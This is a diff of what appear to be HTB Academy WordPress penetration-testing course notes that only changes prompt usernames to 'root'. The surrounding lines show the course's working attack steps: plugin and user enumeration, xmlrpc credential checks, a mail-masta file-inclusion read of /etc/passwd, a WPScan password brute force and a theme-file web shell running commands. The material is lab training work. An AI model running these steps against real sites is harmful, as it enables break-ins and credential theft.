@@ -48,7 +48,7 @@ Below is the directory structure of a default WordPress install, showing the key
 **File Structure**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tree -L 1 /var/www/html
+root@htb[/htb]$ tree -L 1 /var/www/html
 .
 ├── index.php
 ├── license.txt
@@ -150,7 +150,7 @@ require_once ABSPATH . 'wp-settings.php';
 **WP-Content**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tree -L 1 /var/www/html/wp-content
+root@htb[/htb]$ tree -L 1 /var/www/html/wp-content
 .
 ├── index.php
 ├── plugins
@@ -162,7 +162,7 @@ AbdulrahmanTamim@htb[/htb]$ tree -L 1 /var/www/html/wp-content
 **WP-Includes**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
+root@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
 .
 ├── <SNIP>
 ├── theme.php
@@ -252,7 +252,7 @@ We can also find information about the installed plugins by reviewing the source
 &#x20; Plugins and Themes Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+root@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
 http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
 http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
@@ -267,7 +267,7 @@ http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.
 &#x20; Plugins and Themes Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+root@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
 
 http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
 http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
@@ -296,7 +296,7 @@ However, not all installed plugins and themes can be discovered passively. In th
 &#x20; Plugins and Themes Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
+root@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
 
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 13 May 2020 20:08:23 GMT
@@ -309,7 +309,7 @@ Content-Type: text/html; charset=iso-8859-1
 If the content does not exist, we will receive a `404 Not Found error`.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
+root@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
 
 HTTP/1.1 404 Not Found
 Date: Wed, 13 May 2020 20:08:18 GMT
@@ -344,7 +344,7 @@ We can also view the directory listing using cURL and convert the HTML output to
 &#x20; Directory Indexing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
+root@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
 
 ****** Index of /wp-content/plugins/mail-masta ******
 [[ICO]]       Name                 Last_modified    Size Description
@@ -388,7 +388,7 @@ This can also be done with `cURL` from the command line. The HTTP response in th
 &#x20; User Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1
+root@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1
 
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 13 May 2020 20:47:08 GMT
@@ -406,7 +406,7 @@ The above `cURL` request then redirects us to the user's profile page or the mai
 &#x20; User Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=100
+root@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=100
 
 HTTP/1.1 404 Not Found
 Date: Wed, 13 May 2020 20:47:14 GMT
@@ -427,7 +427,7 @@ The second method requires interaction with the `JSON` endpoint, which allows us
 **JSON Endpoint**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
+root@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
 
 [
   {
@@ -462,7 +462,7 @@ If our POST request against `xmlrpc.php` contains valid credentials, we will rec
 **cURL - POST Request**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+root@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
@@ -489,7 +489,7 @@ If the credentials are not valid, we will receive a `403 faultCode` error.
 **Invalid Credentials - 403 Forbidden**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+root@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
@@ -525,7 +525,7 @@ These last few sections introduced several methods for performing manual enumera
 &#x20; WPScan Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gem install wpscan
+root@htb[/htb]$ gem install wpscan
 ```
 
 Once the installation completes, we can issue a command such as `wpscan --hh` to verify the installation. This command will show us the usage menu with all of the available command-line switches.
@@ -533,7 +533,7 @@ Once the installation completes, we can issue a command such as `wpscan --hh` to
 &#x20; WPScan Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wpscan --hh
+root@htb[/htb]$ wpscan --hh
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -680,7 +680,7 @@ We can also validate this vulnerability using cURL on the command line.
 &#x20; Exploiting a Vulnerable Plugin
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+root@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -718,7 +718,7 @@ WPScan can be used to brute force usernames and passwords. The scan report retur
 **WPscan - XMLRPC**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+root@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 
 [+] URL: http://blog.inlanefreight.com/                                                  
 [+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
@@ -774,7 +774,7 @@ We can validate that we have achieved RCE by entering the URL into the web brows
 **RCE**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+root@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 
 uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
 <SNIP>
@@ -797,7 +797,7 @@ We can quickly start `MSF` by issuing the following command:
 &#x20; Attacking WordPress with Metasploit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfconsole
+root@htb[/htb]$ msfconsole
 ```
 
 ***
